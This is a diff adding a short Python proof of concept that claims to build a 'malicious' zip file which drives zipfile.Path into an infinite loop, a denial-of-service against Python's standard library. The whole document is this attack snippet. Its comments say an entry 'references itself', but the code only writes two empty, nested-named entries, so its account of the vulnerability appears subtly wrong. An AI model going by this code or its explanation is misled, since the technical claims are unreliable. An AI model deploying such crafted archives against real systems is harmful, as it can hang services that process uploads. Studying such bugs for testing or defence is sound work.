@@ -1,0 +1,18 @@
+```python
+import zipfile
+import io
+
+# Create a malicious zip file that causes an infinite loop
+malicious_zip = io.BytesIO()
+with zipfile.ZipFile(malicious_zip, 'w') as zf:
+    # Create a zip entry that points to itself, causing an infinite loop
+    zf.writestr('loop.zip', b'')  # Create a zip file inside
+    zf.writestr('loop.zip/loop.zip', b'')  # Reference itself
+
+malicious_zip.seek(0)
+
+# Attempt to read the names using zipfile.Path, which would trigger the vulnerability
+zip_path = zipfile.Path(malicious_zip)
+for name in zip_path.iterdir():
+    print(name)
+```
